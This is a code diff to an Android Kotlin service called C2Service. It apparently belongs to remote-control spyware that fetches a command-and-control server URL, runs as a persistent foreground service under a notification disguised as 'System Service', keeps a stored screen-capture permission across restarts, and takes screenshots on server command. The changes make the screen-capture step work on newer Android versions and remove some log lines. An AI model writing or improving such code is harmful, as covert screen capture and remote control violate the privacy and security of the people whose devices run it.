@@ -3,6 +3,7 @@ package com.outcome.c2
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Build
@@ -24,6 +25,8 @@ class C2Service : Service() {
 
     companion object {
         private const val TAG = "C2Service"
+        private const val NOTIF_ID = 1
+        private const val CHANNEL_ID = "c2"
     }
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
@@ -41,7 +44,10 @@ class C2Service : Service() {
         super.onCreate()
         toast("C2Service onCreate")
         Log.i(TAG, "onCreate deviceId=$deviceId")
-        startForeground(1, buildNotification())
+
+        // Start as dataSync first (safe without projection permission)
+        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+
         serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
             .getString("server_url", BuildConfig.C2_URL)!!
         Log.i(TAG, "serverUrl=$serverUrl")
@@ -55,21 +61,44 @@ class C2Service : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand action=${intent?.action}")
         toast("onStartCommand action=${intent?.action}")
+
         if (intent?.action == "START_PROJECTION") {
             val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
             val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                 intent.getParcelableExtra("proj_data", Intent::class.java)
             else
                 @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
+
             Log.i(TAG, "START_PROJECTION code=$code data=$data")
             toast("START_PROJECTION received")
+
             if (code != Int.MIN_VALUE && data != null) {
+                // 1. Promote to mediaProjection foreground type FIRST
+                startForegroundCompat(
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                )
+
+                // 2. Now it's legal to create the projection
                 initProjectionFromIntent(code, data)
             } else {
-                toast("START_PROJECTION invalid: code=$code data=$data")
+                toast("START_PROJECTION invalid")
             }
         }
         return START_STICKY
+    }
+
+    private fun startForegroundCompat(type: Int) {
+        val notification = buildNotification()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(NOTIF_ID, notification, type)
+            } else {
+                startForeground(NOTIF_ID, notification)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground failed", e)
+            toast("startForeground failed: ${e.message}")
+        }
     }
 
     private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
@@ -83,7 +112,10 @@ class C2Service : Service() {
             val proj = mpm.getMediaProjection(resultCode, data)
             toast("getMediaProjection: $proj")
             Log.i(TAG, "getMediaProjection returned=$proj")
-            if (proj == null) return
+            if (proj == null) {
+                toast("getMediaProjection returned null")
+                return
+            }
 
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
@@ -106,16 +138,14 @@ class C2Service : Service() {
         val prefs = getSharedPreferences("c2", MODE_PRIVATE)
         val code = prefs.getInt("proj_code", Int.MIN_VALUE)
         val uri = prefs.getString("proj_data", null)
-        Log.i(TAG, "tryInitProjectionFromPrefs code=$code uri=${uri?.take(50)}")
-        if (code == Int.MIN_VALUE || uri == null) {
-            toast("no stored projection permission")
-            return
-        }
+        Log.i(TAG, "tryInitProjectionFromPrefs code=$code")
+        if (code == Int.MIN_VALUE || uri == null) return
         try {
             val data = Intent.parseUri(uri, 0)
+            // Promote to mediaProjection type before restoring
+            startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
             initProjectionFromIntent(code, data)
         } catch (e: Exception) {
-            toast("parseUri failed: ${e.message}")
             Log.w(TAG, "parseUri failed: ${e.message}")
         }
     }
@@ -124,11 +154,11 @@ class C2Service : Service() {
 
     private fun buildNotification(): Notification {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel("c2", "System", NotificationManager.IMPORTANCE_MIN)
+            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                 .createNotificationChannel(ch)
         }
-        return NotificationCompat.Builder(this, "c2")
+        return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Service")
             .setContentText("running")
             .setSmallIcon(android.R.drawable.stat_sys_download)
@@ -178,11 +208,9 @@ class C2Service : Service() {
                     val p = projection
                     if (p == null) {
                         toast("screenshot: projection NULL")
-                        Log.w(TAG, "screenshot: projection is NULL")
                         JSONObject().put("error", "projection_not_ready")
                     } else {
                         toast("screenshot: capturing...")
-                        Log.i(TAG, "screenshot: capturing...")
                         Screenshot.capture(this, p)
                     }
                 }
